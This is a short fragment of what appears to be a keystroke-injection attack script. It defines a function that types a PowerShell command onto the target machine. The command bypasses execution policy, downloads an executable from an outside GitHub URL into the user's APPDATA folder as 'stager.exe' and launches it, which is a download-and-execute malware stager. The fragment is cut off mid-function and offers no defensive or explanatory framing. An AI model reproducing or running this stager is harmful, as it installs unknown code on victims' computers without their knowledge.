...
function executepayload() {
    type("powershell.exe -nop -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Georg-prog-cmd/GeorgGit/master/PisosPro.exe', $env:APPDATA + '\stager.exe'); Start-Process $env:APPDATA'\stager.exe' \n");
